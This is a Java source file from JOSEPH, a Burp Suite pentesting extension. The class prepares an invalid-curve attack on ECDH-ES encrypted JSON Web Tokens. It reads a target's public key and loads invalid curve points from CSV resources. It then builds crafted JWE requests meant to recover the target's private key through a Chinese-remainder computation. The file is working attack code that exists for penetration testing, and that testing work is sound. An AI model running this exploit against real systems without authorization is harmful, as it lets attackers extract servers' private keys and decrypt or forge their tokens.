/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.invalid_curve;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.utilities.*;
import org.apache.commons.csv.CSVRecord;
import org.bouncycastle.jce.interfaces.ECPrivateKey;
import org.bouncycastle.jce.interfaces.ECPublicKey;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.bouncycastle.pqc.math.linearalgebra.ByteUtils;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import javax.swing.*;
import java.awt.*;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.security.*;
import java.security.spec.ECGenParameterSpec;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.ResourceBundle;

/**
 * Invalid Curve Attack Info is used for the preparation of the Invalid Curve attack. It is holding meta data and all necessary parameter.
 *
 * @author Vincent Unsel
 * @version 1.0
 */
public class InvalidCurveInfo implements IAttackInfo {
    /* private class variables */
    /* class resources */
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    /* class info */
    private static final String id = "invalid_curve"; // Unique identifier for the attack class
    private static final String name = "Invalid Curve"; // Full name of the attack
    private static final String[] encryption = { "A128GCM", "A192GCM", "A256GCM", "A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512" }; // supported

    private static final String[] algorithms = { "ECDH-ES", "ECDH-ES+A128KW", "ECDH-ES+A192KW", "ECDH-ES+A256KW" };// Supported algorithm
    private static final String[] curves = { "P-256", "P-384", "P-521" };// Supported curves
    private static final String description = "<html>The <em>"
            + name
            + "</em> attack exploits a vulnerability where the "
            + "<em>Elliptic Curve Diffie-Hellman Key Exchange</em> is done using points on different curves.<br/>"
            + "Such a vulnerability occurs, if the validation of the given point or of resulted computations on the curve is missing. "
            + "Note that the target is not vulnerable, if no further response matches the first and only ECDH in the table. Therefore, it is recommended to cancel the attack, as the targets secret key will never be calculated without the vulnerability! </html>"; // Attack
    // description

    private int amountRequests = 0; // Amount of requests needed

    /* Burp */
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IRequestInfo requestInfo;

    /* JOSE */
    private JoseParameter parameter;
    private List<InvalidCurveAttackRequest> requests = new ArrayList<>();// List of prepared requests with payload info

    /* Attack Utils */
    private ECPublicKey ecPublicKey;
    private CSVReader csvReader;
    private int ivCount = 0;
    private byte[][] initializationVector = { null, null };
    private byte[][] encryptionKey = { null, null, null, null, null };
    /* GUI */
    private JComboBox<String> publicKeySelection;
    private JComboBox<String> algorithmSelection;
    private JComboBox<String> encryptionSelection;
    private JComboBox<String> curveSelection;
    private JTextArea publicKeyTextArea;
    private JTextArea publicKeyIdTextArea;
    private JTextArea apuTextArea;
    private JTextArea apvTextArea;
    private JTextArea plainTextArea;
    private JSpinner thresholdSelection;

    /**
     * Initializes the InvalidCurveInfo
     * 
     * @param callbacks
     *            of the BurpExtender
     */
    public InvalidCurveInfo(IBurpExtenderCallbacks callbacks) {
        initGUI();
        this.initializationVector[0] = new byte[8];
        this.initializationVector[1] = new byte[12];
        this.encryptionKey[0] = this.initializationVector[1];
        this.encryptionKey[1] = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8 };
        this.encryptionKey[2] = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        this.encryptionKey[3] = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1,
                2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        this.encryptionKey[4] = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1,
                2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
        this.helpers = callbacks.getHelpers();
    }

    /**
     * Prepares the attack and returns the executing instance.
     * 
     * @param callbacks
     * @param requestResponse
     *            {@link IHttpRequestResponse} requestResponse message
     * @param requestInfo
     *            {@link IRequestInfo} analyzed request
     * @param parameter
     *            {@link JoseParameter} JOSE parameter
     * @return InvalidCurve actual attack execution.
     * @throws AttackPreparationFailedException
     */
    @Override
    public InvalidCurve prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter)
            throws AttackPreparationFailedException {
        this.requestResponse = requestResponse;
        this.requestInfo = requestInfo;
        setParameter(parameter);
        this.requests.clear();

        loggerInstance.log(getClass(), "Attack preparation: ", Logger.LogLevel.DEBUG);
        String publicKeyValue = publicKeyTextArea.getText();

        // Throw error if public key value is empty
        if (publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        int publicKeyFormat = publicKeySelection.getSelectedIndex();
        switch (publicKeyFormat) {
            case 0: // JWK (JSON)
                // loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);
                /*
                 * Read the targets public key
                 */
                Object publicKeyValueJson;
                try {
                    publicKeyValueJson = new JSONParser().parse(publicKeyValue);
                    ecPublicKey = Converter.getECPublicKeyByJwk(publicKeyValueJson);
                    if (ecPublicKey == null)
                        new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                    break;
                } catch (ParseException e) {
                    loggerInstance.log(getClass(), "Error in prepareAttack (JWK):  " + e.getMessage(), Logger.LogLevel.ERROR);
                    e.printStackTrace();
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                } catch (Exception e) {
                    loggerInstance.log(getClass(), "Error parsing: " + e.getMessage(), Logger.LogLevel.ERROR);
                }
                break;
            case 1: // PEM
                ecPublicKey = (ECPublicKey) Converter.getECPublicKeyByPemString(publicKeyValue);
                if (ecPublicKey == null)
                    new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);
                break;
            default:
                break;
        }
        loggerInstance.log(getClass(), "Generate first valid request. ", Logger.LogLevel.DEBUG);
        generateRequest(generateValidKey());// _unshorted
        String resourceFile = "invalidPoints" + curveSelection.getSelectedItem() + ".csv";
        setCSVReader(new CSVReader(resourceFile));
        loggerInstance.log(getClass(), "Preparation done. " + publicKeyValue, Logger.LogLevel.DEBUG);
        return new InvalidCurve(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    private void setAmountRequests(int amount) {
        this.amountRequests = amount;
    }

    protected void setParameter(JoseParameter parameter) {
        this.parameter = parameter;
    }

    /**
     * Initialises the AttackTab GUI components used in getExtraUI method.
     */
    private void initGUI() {
        algorithmSelection = new JComboBox<>();
        DefaultComboBoxModel<String> algorithmSelectionListModel = new DefaultComboBoxModel<>();
        for (String algorithm : algorithms) {
            algorithmSelectionListModel.addElement(algorithm);
        }
        algorithmSelection.setModel(algorithmSelectionListModel);

        encryptionSelection = new JComboBox<>();
        DefaultComboBoxModel<String> encryptionSelectionListModel = new DefaultComboBoxModel<>();
        for (String encryption : encryption) {
            encryptionSelectionListModel.addElement(encryption);
        }
        encryptionSelection.setModel(encryptionSelectionListModel);

        curveSelection = new JComboBox<>();
        DefaultComboBoxModel<String> curveSelectionListModel = new DefaultComboBoxModel<>();
        for (String curve : curves) {
            curveSelectionListModel.addElement(curve);
        }
        curveSelection.setModel(curveSelectionListModel);

        SpinnerNumberModel model = new SpinnerNumberModel(0.9, 0.1, 1.0, 0.05);
        thresholdSelection = new JSpinner(model);
        // ((JSpinner.DefaultEditor)thresholdSelection.getEditor()).getTextField().setEditable(false);

    }

    /**
     * Enables extra GUI components in the AttackTab.
     *
     * @param extraPanel
     *            Panel for components
     * @param constraints
     *            used by the GridBagLayout to organize component positions
     * @return
     */
    @Override
    public boolean getExtraUI(JPanel extraPanel, GridBagConstraints constraints) {

        /* Public key text field */
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel = new DefaultComboBoxModel<>();
        publicKeyTextArea = new JTextArea(10, 50);
        publicKeyTextArea.setLineWrap(true);
        publicKeySelectionListModel.addElement("JWK or JWE header (JSON String)");
        publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelection.setModel(publicKeySelectionListModel);
        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);
        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);
        constraints.gridy = 2;
        JScrollPane jScrollPane = new javax.swing.JScrollPane();
        jScrollPane.setViewportView(publicKeyTextArea);
        extraPanel.add(jScrollPane, constraints);

        JLabel publicKeyIdLabel = new JLabel("Key ID (kid) to specify used key (optional):");
        publicKeyIdTextArea = new JTextArea(1, 50);
        publicKeyIdTextArea.setLineWrap(true);
        JScrollPane jScrollPaneKeyId = new javax.swing.JScrollPane();
        jScrollPaneKeyId.setViewportView(publicKeyIdTextArea);
        jScrollPaneKeyId.setViewportView(publicKeyIdTextArea);
        constraints.gridy = 3;
        extraPanel.add(publicKeyIdLabel, constraints);
        constraints.gridy = 4;
        extraPanel.add(jScrollPaneKeyId, constraints);

        JLabel apuLabel = new JLabel("PartyUInfo (apu) to give further information (optional):");
        apuTextArea = new JTextArea(1, 50);
        apuTextArea.setLineWrap(true);
        JScrollPane jScrollPaneApu = new javax.swing.JScrollPane();
        jScrollPaneApu.setViewportView(apuTextArea);
        constraints.gridy = 5;
        extraPanel.add(apuLabel, constraints);
        constraints.gridy = 6;
        extraPanel.add(jScrollPaneApu, constraints);

        JLabel apvLabel = new JLabel("PartyVInfo (apv) to give further information (optional):");
        apvTextArea = new JTextArea(1, 50);
        apvTextArea.setLineWrap(true);
        JScrollPane jScrollPaneApv = new javax.swing.JScrollPane();
        jScrollPaneApv.setViewportView(apvTextArea);
        constraints.gridy = 7;
        extraPanel.add(apvLabel, constraints);
        constraints.gridy = 8;
        extraPanel.add(jScrollPaneApv, constraints);

        JLabel plainTextLabel = new JLabel("Change the plaintext to be transmitted (optional):");
        plainTextArea = new JTextArea("JOSEPH Hello!", 1, 50);
        plainTextArea.setLineWrap(true);
        JScrollPane jScrollPanePlainText = new javax.swing.JScrollPane();
        jScrollPanePlainText.setViewportView(plainTextArea);
        constraints.gridy = 9;
        extraPanel.add(plainTextLabel, constraints);
        constraints.gridy = 10;
        extraPanel.add(jScrollPanePlainText, constraints);

        /* Key exchange algorithm selection */
        JLabel algorithmLabel = new JLabel("Select algorithm for the key exchange:");
        constraints.gridy = 11;
        extraPanel.add(algorithmLabel, constraints);
        constraints.gridy = 12;
        extraPanel.add(algorithmSelection, constraints);

        /* Encryption algorithm selection */
        JLabel encryptionLabel = new JLabel("Select encryption mode:");
        constraints.gridy = 13;
        extraPanel.add(encryptionLabel, constraints);
        constraints.gridy = 14;
        extraPanel.add(encryptionSelection, constraints);

        /* Elliptic curve selection */
        JLabel curveLabel = new JLabel("Select elliptic curve:");
        constraints.gridy = 15;
        extraPanel.add(curveLabel, constraints);
        constraints.gridy = 16;
        extraPanel.add(curveSelection, constraints);

        /* Threshold selection */
        JLabel thresholdLabel = new JLabel("Select compare threshold:");
        constraints.gridy = 17;
        extraPanel.add(thresholdLabel, constraints);
        constraints.gridy = 18;
        extraPanel.add(thresholdSelection, constraints);
        return true;
    }

    @Override
    public boolean isSuitable(JoseParameter.JoseType type, String algorithm) {
        return (type == JoseParameter.JoseType.JWE);
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return requestResponse;
    }

    @Override
    public List<InvalidCurveAttackRequest> getRequests() {
        return requests;
    }

    @Override
    public HashMap<String, ? extends Enum> getPayloadList() {
        return null;
    }

    public double getThreshold() {
        return (double) this.thresholdSelection.getValue();
    }

    /**
     * Get targets public key.
     * 
     * @return {@link ECPublicKey} ecPublicKey
     */
    public ECPublicKey getEcPublicKey() {
        return ecPublicKey;
    }

    /**
     * Get targets public key.
     * 
     * @param {@link ECPublicKey} ecPublicKey
     */
    protected void setEcPublicKey(ECPublicKey ecPublicKey) {
        this.ecPublicKey = ecPublicKey;
    }

    /**
     * Get Point instance from a elliptic curve KeyPair.
     * 
     * @param keyPair
     * @return point
     */
    public Point getPointFromECKeyPair(KeyPair keyPair) {
        ECPublicKey pub = (ECPublicKey) keyPair.getPublic();
        ECPrivateKey priv = (ECPrivateKey) keyPair.getPrivate();
        return new Point(priv.getParameters().getN(), priv.getD(), pub.getQ().getAffineXCoord().toBigInteger(), pub.getQ().getAffineYCoord().toBigInteger());
    }

    // Optional and in this case not needed
    @Override
    public HashMap<String, String> updateValuesByPayload(Enum payloadType, String header, String payload, String signature) {
        return null;
    }

    /**
     * Get comma separated value reader.
     * 
     * @return csvReader
     */
    public CSVReader getCSVReader() {
        return csvReader;
    }

    /**
     * Set comma separated value reader.
     * 
     * @param reader
     */
    public void setCSVReader(CSVReader reader) {
        this.csvReader = reader;
    }

    /**
     * Generate InvalidCurveAttackRequest from elliptic curve KeyPair.
     * 
     * @param keyPair
     */
    private void generateRequest(KeyPair keyPair) {
        ECPrivateKey ecPrivateKey = (ECPrivateKey) keyPair.getPrivate();
        ECPublicKey ecPublicKey = (ECPublicKey) keyPair.getPublic();
        loggerInstance.log(this.getClass(),
                "" + ecPublicKey.getQ().getXCoord() + " " + ecPublicKey.getQ().getYCoord() + " " + curveSelection.getSelectedItem(), Logger.LogLevel.DEBUG);
        loggerInstance.log(getClass(), "GenerateRequest from ECPubKey.", Logger.LogLevel.DEBUG);
        Point p = new Point(ecPublicKey.getQ().getCurve().getOrder(), ecPrivateKey.getD(), ecPublicKey.getQ().getXCoord().toBigInteger(), ecPublicKey.getQ()
                .getYCoord().toBigInteger());
        generateRequest(p, p, getEcPublicKey());
    }

    /**
     * Generate InvalidCurveAttackRequest from targets ephemeral ECPublicKey, the static Point and the subgroup generator Point.
     *
     * @param headerPoint
     *            subgroup generator
     * @param dhPoint
     *            subgroup Point
     * @param ecPublicKey
     *            targets public key
     */
    private void generateRequest(Point headerPoint, Point dhPoint, ECPublicKey ecPublicKey) {
        String[] components;
        components = generateJWE(headerPoint, dhPoint, ecPublicKey);
        byte[] request = this.requestResponse.getRequest();
        String token = Decoder.concatComponents(components);
        byte[] tmpRequest = JoseParameter.updateRequest(request, this.parameter, helpers, token);
        requests.add(new InvalidCurveAttackRequest(tmpRequest, dhPoint));
        loggerInstance.log(getClass(), "Generated request: " + token, Logger.LogLevel.DEBUG);
        this.setAmountRequests(requests.size());
    }

    /**
     * Generate a elliptic curve KeyPair used in the first request.
     * 
     * @return {@link KeyPair} key pair
     */
    public KeyPair generateValidKey() {
        if (Security.getProvider(BouncyCastleProvider.PROVIDER_NAME) == null) {
            Security.addProvider(new BouncyCastleProvider());
        }
        loggerInstance.log(getClass(), "Generate valid key.", Logger.LogLevel.DEBUG);

        ECGenParameterSpec ecGenSpec = new ECGenParameterSpec(curveSelection.getSelectedItem().toString());
        try {
            KeyPairGenerator generator = KeyPairGenerator.getInstance("EC", "BC");
            generator.initialize(ecGenSpec, new SecureRandom());
            KeyPair pair = generator.generateKeyPair();
            ChineseRemainder.startInstance(this.getEcPublicKey(), ((ECPrivateKey) pair.getPrivate()).getParameters());
            return pair;
        } catch (Exception e) {
            e.printStackTrace();
            loggerInstance.log(getClass(), "Failed generating valid public key." + e.getMessage(), Logger.LogLevel.ERROR);
        }
        return null;
    }

    /**
     * Generate InvalidCurveAttackRequests for the next subgroup.
     */
    public void generateRequestSet() {
        List<? super Iterable<String>> ips = csvReader.getEqualLinesFirstColumn();
        Point headerPoint;
        headerPoint = new Point(new BigInteger(((CSVRecord) ips.get(0)).get(0)), new BigInteger(((CSVRecord) ips.get(0)).get(1)), new BigInteger(
                ((CSVRecord) ips.get(0)).get(2)), new BigInteger(((CSVRecord) ips.get(0)).get(3)));
        for (Object record : ips) {
            generateRequest(headerPoint, new Point(new BigInteger(((CSVRecord) record).get(0)), // order
                    new BigInteger(((CSVRecord) record).get(1)), // value
                    new BigInteger(((CSVRecord) record).get(2)), // x
                    new BigInteger(((CSVRecord) record).get(3))), null); // y
        }
        loggerInstance.log(getClass(), "Amount of requests: " + getAmountRequests(), Logger.LogLevel.DEBUG);
    }

    /**
     * Generate the JWE as String array. See: RFC7518 p. 9 BASE64URL(UTF8(JWE Protected Header)) BASE64URL(JWE Encrypted Key) BASE64URL(JWE
     * Initialization Vector) BASE64URL(JWE Ciphertext) BASE64URL(JWE Authentication Tag)
     * 
     * @param headerPoint
     *            subgroup generator
     * @param dhPoint
     *            subgroup Point
     * @param {@link ECPublicKey} targets public key or null
     */
    public String[] generateJWE(Point headerPoint, Point dhPoint, ECPublicKey ecPublicKey) {
        String[] result = { null, null, null, null, null };

        byte[][] tmp = new byte[0][];
        try {
            tmp = getComponents(headerPoint, dhPoint, ecPublicKey);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        for (int i = 0; i < 5; ++i) {
            result[i] = Decoder.base64UrlEncode(tmp[i]);
        }
        return result;
    }

    /**
     * Get the components for the JWE generation using GUI inputs and delegated key inputs.
     * 
     * @param headerPoint
     *            subgroup generator
     * @param dhPoint
     *            subgroup Point
     * @param ecPublicKey
     *            {@link ECPublicKey} targets public key or null
     * @return components as byte array
     * @throws NoSuchAlgorithmException
     */
    protected byte[][] getComponents(Point headerPoint, Point dhPoint, ECPublicKey ecPublicKey) throws NoSuchAlgorithmException {
        String partyUInfo = apuTextArea == null ? "" : apuTextArea.getText();
        String partyVInfo = apvTextArea == null ? "" : apvTextArea.getText();
        String plainText = plainTextArea.getText();
        return getComponents(headerPoint, dhPoint, partyUInfo, partyVInfo, plainText, ecPublicKey);
    }

    /**
     * Get the components for the JWE generation using delegated key and additional inputs.
     * 
     * @param headerPoint
     *            subgroup generator
     * @param dhPoint
     *            subgroup Point
     * @param apu
     *            additional information for concat KDF
     * @param apv
     *            additional information for concat KDF
     * @param plaintext
     *            text to get encrypted
     * @param ecPublicKey
     *            {@link ECPublicKey} targets public key or null
     * @return components as byte array
     * @throws NoSuchAlgorithmException
     */
    protected byte[][] getComponents(Point headerPoint, Point dhPoint, String apu, String apv, String plaintext, ECPublicKey ecPublicKey)
            throws NoSuchAlgorithmException {
        String algorithm = algorithmSelection.getSelectedItem().toString();
        String encAlg = encryptionSelection.getSelectedItem().toString();
        byte[] partyUInfo = Crypto.concatLengthInfo(apu);
        byte[] partyVInfo = Crypto.concatLengthInfo(apv);
        byte[] plainText = plaintext.getBytes();
        int wrapSize = Crypto.getEcdhAesKwKeyLengthByJoseAlgorithm(algorithm, 16);
        int encSize = Crypto.getAeadKeyLengthByJoseAlgorithm(encAlg, 32);
        byte[] algorithmID;
        byte[][] components = { null, null, null, null, null };
        byte[] z = Crypto.ecdhAgreement(dhPoint, ecPublicKey);
        byte[] cek;
        byte[] encKey = null;
        byte[][] cipherTextAndAuthenticationTag;
        try {
            components[0] = getHeader(headerPoint, Decoder.base64UrlEncode(apu.getBytes()), Decoder.base64UrlEncode(apv.getBytes()));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        switch (algorithm) {
            case "ECDH-ES": // result key has to be as long as "enc" specifies
                algorithmID = Crypto.concatLengthInfo(encAlg);
                cek = Crypto.concatKDF(z, encSize, algorithmID, partyUInfo, partyVInfo);
                encKey = cek;
                components[1] = new byte[0];
                break;
            case "ECDH-ES+A128KW":
            case "ECDH-ES+A192KW":
            case "ECDH-ES+A256KW":
                algorithmID = Crypto.concatLengthInfo(algorithm);
                cek = Crypto.concatKDF(z, wrapSize, algorithmID, partyUInfo, partyVInfo);
                encKey = getEncryptionKey(encSize);
                components[1] = Crypto.getAESKeyWrapping(cek, encKey);
                break;
            default:
                break;
        }
        switch (encAlg) {
            case "A128CBC-HS256": // 256 bit key needed
            case "A192CBC-HS384": // 384 bit key needed
            case "A256CBC-HS512": // 512 bit key needed
                components[2] = ByteUtils.concatenate(initializationVector[1], ByteBuffer.allocate(4).putInt(ivCount++).array());
                break;
            //
            case "A128GCM":
            case "A192GCM":
            case "A256GCM":
                components[2] = ByteUtils.concatenate(initializationVector[0], ByteBuffer.allocate(4).putInt(ivCount++).array());
                break;
            default:
                break;
        }
        cipherTextAndAuthenticationTag = Crypto.getAead(components[0], encKey, components[2], plainText);
        components[3] = cipherTextAndAuthenticationTag[0];
        components[4] = cipherTextAndAuthenticationTag[1];
        return components;
    }

    /**
     * Get static Encryption Key of the given size.
     * 
     * @param encSize
     * @return emcryptionKey as byte array
     */
    private byte[] getEncryptionKey(int encSize) {
        byte[] result;
        switch (encSize) {
            case 16:
                result = encryptionKey[0];
                break;
            case 24:
                result = encryptionKey[1];
                break;
            case 32:
                result = encryptionKey[2];
                break;
            case 48:
                result = encryptionKey[3];
                break;
            case 64:
                result = encryptionKey[4];
                break;
            default:
                result = null;
                break;
        }
        return result;
    }

    /**
     * Get the JWE Header component.
     * 
     * @param point
     *            subgroup generator point
     * @param partyUInfo
     *            additional information for concat KDF
     * @param partyVInfo
     *            additional information for concat KDF
     * @return jweHeader as byte array
     * @throws UnsupportedEncodingException
     */
    public byte[] getHeader(Point point, String partyUInfo, String partyVInfo) throws UnsupportedEncodingException {
        String kid = publicKeyIdTextArea == null || publicKeyIdTextArea.getText().isEmpty() ? "" : ",\"kid\":\"" + publicKeyIdTextArea.getText() + "\"";
        String apu = partyUInfo.isEmpty() ? "" : "\"apu\":\"" + partyUInfo + "\",";
        String apv = partyVInfo.isEmpty() ? "" : "\"apv\":\"" + partyVInfo + "\",";
        BigInteger x = point.getX();
        BigInteger y = point.getY();
        String result = "{\"alg\":\"" + algorithmSelection.getSelectedItem().toString() + "\"," + "\"enc\":\""
                + encryptionSelection.getSelectedItem().toString() + "\",\"typ\":\"JWE\"," + apu + apv + "\"epk\":{" + "\"kty\":\"EC\"," + "\"crv\":\""
                + curveSelection.getSelectedItem() + "\"," + "\"x\":\"" + Decoder.base64UrlEncode(x.toByteArray()) + "\"," + "\"y\":\""
                + Decoder.base64UrlEncode(y.toByteArray()) + "\"" + kid + "}}";
        return result.getBytes("UTF-8");
    }
}
